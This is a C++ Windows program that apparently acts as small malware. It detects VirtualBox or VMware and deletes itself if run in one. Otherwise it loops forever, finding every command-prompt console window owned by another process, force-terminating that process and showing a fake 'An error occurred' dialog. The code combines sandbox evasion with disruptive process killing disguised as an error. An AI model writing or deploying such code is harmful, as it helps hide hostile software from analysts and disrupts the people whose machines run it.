#include <iostream>
#include <Windows.h>

#include <TlHelp32.h>
#include <tchar.h>
#include <vector>
#include <string>

#include "Header.h"

using namespace std;

const WCHAR* char_class[] = {

	L"ConsoleWindowClass", // CMD

};

int Numlimit = 1;

BOOL KProc(DWORD Pid)
{
	DWORD Access = PROCESS_ALL_ACCESS;
	BOOL CHandle = false;
	HANDLE hP = OpenProcess(Access, CHandle, Pid);
	if (hP == NULL)
		return 0;
	BOOL result = TerminateProcess(hP, 1);
	CloseHandle(hP);
	return 0;
}

string cts(const WCHAR* a, int size)
{
	int i;
	wstring s = L"";
	for (i = 0; i < size; i++) {
		s = s + a[i];
	}
	string ss(s.begin(), s.end());
	return ss;
}

int ch = 0;

bool test()
{
	DWORD p = GetCurrentProcessId();
	DWORD cProcess = 0;
	DWORD bProcess = 0;
	//printf("p[%02X,%i]\n", p, p);
	TCHAR bufText[1024];
	TCHAR bufClass[1024];
	HWND CurWnd = nullptr;

	do {
		//printf("ch[%i]\n", ch);
		CurWnd = FindWindowEx(nullptr, CurWnd, nullptr, nullptr);
		GetWindowText(CurWnd, bufText, 255);
		GetClassName(CurWnd, bufClass, 255);
		GetWindowThreadProcessId(CurWnd, &cProcess);
		//printf("%d\n", getppid(cProcess));
		//printf("cProcess [%d]\n", cProcess);
		if (p == cProcess)
		{
			//printf("----------------------------------------------------------------------\n");
			//break;
		}
		if (cProcess != p)
		{
			string dump_str = "ConsoleWindowClass"; //
			//string str1(cts(bufClass, 255).c_str());
			std::wstring wStr = bufClass;
			string str = std::string(wStr.begin(), wStr.end());
			//printf("str[%s]\n", str.c_str());
			string str1 = str;
			string str2(dump_str);
			if (str1.find(str2) != string::npos)
			{
				if (_tcscmp(bufText, L"") != 0) //next
				{
					//printf("\t\t\t\tFind String\n");
					bProcess = cProcess;
					KProc(cProcess);
					MessageBoxW(0, bufText, L"An error occurred", MB_OK | MB_ICONERROR);
					memset(bufText, 0, sizeof(bufText));
					memset(bufClass, 0, sizeof(bufClass));
					//wprintf(L"bufText[%s],[%d]\n", bufText, bProcess);
				}
			}

			ch++;
		}
	} while (CurWnd != nullptr);
	//printf("---------------------------------------------------\n");
	ch = 0;
	return false;
}

void cLoop()
{
	//printf("cLoop Start\n");
	//for (int i = 0; i < 2; i++)
	//	test();
	while (true)
	{
		test();
		Sleep(1000);
	}
}

int main()
{
	bool isVm = false;

	if (DetectVM::IsVboxVM() == true) 
	{ 
		isVm = true; 
	//printf("Running in vbox!"); 
	}
	else if (DetectVM::IsVMwareVM() == true) 
	{ 
		isVm = true; 
		//printf("Running in vmware!"); 
	}
	else { 
		//printf("Not running in a VM!"); 
	}

	if (isVm) { DetectVM::SelfDelete(); exit(-1); }

	SetConsoleTitleW(L"ggez");

	AllocConsole();
	freopen("conin$", "r", stdin);
	freopen("conout$", "w", stdout);
	freopen("conout$", "w", stderr);

	printf("test eiei");

	cLoop();

	getchar();

	system("pause");
}